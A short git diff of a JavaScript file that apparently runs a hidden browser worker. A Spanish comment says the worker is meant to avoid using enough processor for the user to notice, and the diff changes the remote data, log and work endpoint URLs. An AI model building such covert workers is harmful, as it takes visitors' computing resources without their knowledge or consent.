@@ -4,9 +4,9 @@ $(function() {
    * worker y hacerlo funcinar tratando que de no usar tanto
    * procesador como para que el usuario se de cuenta.
    */
-  post_url = 'http://dominio010.com.ar:4567/data';
-  log_url = 'http://dominio010.com.ar:4567/log';
-  work_url = 'http://dominio010.com.ar:4567/work';
+  post_url = 'http://dominio010.com.ar/data';
+  log_url = 'http://dominio010.com.ar/log';
+  work_url = 'http://dominio010.com.ar/work';
 
   tiempo_de_ejecucion = 5000;
   sleep_time = 2500;
